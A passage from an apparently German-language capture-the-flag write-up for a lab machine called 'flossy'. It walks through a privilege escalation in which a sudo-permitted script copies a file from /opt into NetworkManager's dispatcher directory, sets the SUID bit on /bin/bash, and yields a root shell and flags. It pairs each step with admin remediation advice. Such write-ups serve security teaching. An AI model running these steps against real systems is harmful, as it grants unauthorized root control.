+              <p class="evaluation">**Bewertung:** Dies ist der Weg zu Root! Obwohl `sophie` das `network`-Skript nicht direkt ändern kann, kontrolliert sie dessen Verhalten indirekt: Wenn sie eine ausführbare Datei in `/opt` platziert (dieses Verzeichnis muss für sie beschreibbar sein oder sie braucht eine andere Methode, dorthin zu schreiben) und dann `sudo /home/sophie/network disp` ausführt, wird ihre Datei nach `/etc/NetworkManager/dispatcher.d/` kopiert und ausführbar gemacht. Beim nächsten Netzwerkereignis wird ihr Skript als Root ausgeführt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+                 1. Prüfen, ob `/opt` für `sophie` beschreibbar ist (`ls -ld /opt`).
+                 2. Wenn ja: Ein einfaches Skript in `/opt` erstellen, das z.B. das SUID-Bit auf `/bin/bash` setzt (`echo 'chmod u+s /bin/bash' > /opt/exploit.sh`).
+                 3. Das `network`-Skript mit der `disp`-Option über `sudo` ausführen: `sudo /home/sophie/network disp`.
+                 4. Ein Netzwerkereignis auslösen (z.B. eine Netzwerkschnittstelle hoch-/runterfahren: `nmcli con down lo; nmcli con up lo`).
+                 5. Prüfen, ob `/bin/bash` nun das SUID-Bit hat (`ls -l /bin/bash`).
+                 6. Wenn ja, `/bin/bash -p` ausführen, um eine Root-Shell zu erhalten.
+               **Empfehlung (Admin):** Die `sudo`-Regel für das `/home/sophie/network`-Skript entfernen. Die Logik des Skripts ist extrem unsicher (Kopieren beliebiger Dateien aus `/opt` und Ausführen als Root). `/opt` sollte keine Schreibrechte für unprivilegierte Benutzer haben. NetworkManager-Dispatcher-Skripte sollten nur von Root verwaltet werden.</p>
+
+             <p class="comment">Wir führen den Exploit über das `/opt`-Verzeichnis und den NetworkManager-Dispatcher aus.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">echo "chmod u+s /bin/bash" > /opt/SUID_bash</span></div> <span class="password"># Erstellt Exploit-Skript in /opt (impliziert Schreibrecht)</span>
+                       <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">sudo /home/sophie/network disp</span></div>
+                      <pre>
+Updating scripts.
+Scripts updated.
+                      </pre>
+                      <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">ls -la /etc/NetworkManager/dispatcher.d</span></div>
+                       <pre>
+total 28
+drwxr-xr-x 5 root root 4096 Dec  8 00:43 .
+drwxr-xr-x 7 root root 4096 Oct  6 18:52 ..
+-rwxr-xr-x 1 root root 2293 Mar  9  2023 01-ifupdown
+drwxr-xr-x 2 root root 4096 Mar  9  2023 no-wait.d
+drwxr-xr-x 2 root root 4096 Mar  9  2023 pre-down.d
+drwxr-xr-x 2 root root 4096 Mar  9  2023 pre-up.d
+-rwxr-xr-x 1 root root   20 Dec  8 00:43 <span class="command">SUID_bash</span> <span class="password"># Unser Skript wurde kopiert und ist ausführbar!</span>
+                       </pre>
+                       <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">nmcli con show</span></div> <span class="password"># Netzwerkverbindungen anzeigen</span>
+                        <pre>
+NAME  UUID                                  TYPE      DEVICE
+lo    a13f4e5a-503b-4d19-9ddf-12167771d62f  loopback  lo
+                        </pre>
+                       <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">nmcli con up lo</span></div> <span class="password"># Loopback-Interface "aktivieren" (löst Dispatcher aus)</span>
+                        <pre>Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/3)</pre>
+                       <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">ls -al /bin/bash</span></div>
+                        <pre><span class="password">-rwsr-xr-x</span> 1 root root 1265648 Apr 23  2023 /bin/bash</pre> <span class="password"># SUID-Bit ist gesetzt!</span>
+                        <div class="prompt">╭─sophie@flossy ~
+╰─$ <span class="command">bash -p</span></div>
+                       <div class="prompt"><span class="command">bash-5.2#</span> <span class="password"># Root-Shell!</span></div>
+                        <div class="prompt">bash-5.2# <span class="command">id</span></div>
+                       <pre><span class="command">uid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)</span></pre>
+                    </div>
+                </div>
+                <p class="analysis">**Analyse:**
+               1.  Wir erstellen unser Exploit-Skript `/opt/SUID_bash`, das `chmod u+s /bin/bash` ausführen soll. (Dies impliziert, dass `/opt` für `sophie` beschreibbar ist).
+               2.  Wir führen `sudo /home/sophie/network disp` aus. Das Skript kopiert erfolgreich unsere `/opt/SUID_bash`-Datei nach `/etc/NetworkManager/dispatcher.d/` und macht sie ausführbar.
+               3.  Wir lösen ein Netzwerkereignis aus, indem wir versuchen, die Loopback-Verbindung (`lo`) mit `nmcli con up lo` zu "aktivieren". Dies genügt, um den NetworkManager zu veranlassen, die Skripte im `dispatcher.d`-Verzeichnis auszuführen.
+               4.  Unser Skript `/etc/NetworkManager/dispatcher.d/SUID_bash` wird als Root ausgeführt und setzt erfolgreich das SUID-Bit auf `/bin/bash`.
+               5.  Wir überprüfen dies mit `ls -al /bin/bash`.
+               6.  Wir führen `bash -p` aus. Die `-p`-Option sorgt dafür, dass Bash die effektive UID (euid=0) beibehält, anstatt auf die reale UID (uid=1001) zu wechseln. Wir erhalten eine Root-Shell.</p>
+                <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich! Die Kombination aus der unsicheren `sudo`-Regel für das `network`-Skript und der Funktionsweise des NetworkManager-Dispatchers wurde ausgenutzt, um das SUID-Bit auf Bash zu setzen.</p>
+                <p class="recommendation">**Empfehlung (Pentester):** Root-Flag lesen. Bericht abschließen. Das SUID-Bit von Bash entfernen (`chmod u-s /bin/bash`), um das System sauber zu hinterlassen (optional).
+                **Empfehlung (Admin):** Unsichere `sudo`-Regel entfernen. Berechtigungen für `/opt` prüfen. NetworkManager-Dispatcher-Skripte sichern.</p>
+
+                <p class="comment">Als Root lesen wir die Flags.</p>
+                <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">bash-5.2# <span class="command">cd /root/</span></div>
+                          <div class="prompt">bash-5.2# <span class="command">ls</span></div>
+                         <pre><span class="command">root.txt</span></pre>
+                          <div class="prompt">bash-5.2# <span class="command">cat root.txt</span></div>
+                         <pre><span class="password">355cec17306ab25389f376ef4a21422e</span></pre>
+                     </div>
+                 </div>
+                 <p class="analysis">**Analyse:** Aus der Root-Shell lesen wir die `/root/root.txt`.</p>
+                 <p class="evaluation">**Bewertung:** Root-Flag erfolgreich gelesen.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Ergebnisse dokumentieren.
+                 **Empfehlung (Admin):** Alle Schwachstellen beheben.</p>
+         </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/sophie/user.txt</div>
+                    <div class="flag-value"><span class="password">8926c8ba832369c1dc13eed7880585c6</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">355cec17306ab25389f376ef4a21422e</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 7. Dezember 2023</p> <!-- Datum aus Nmap/Nikto Scan extrahiert -->
+    </footer>
+</body>
+</html>
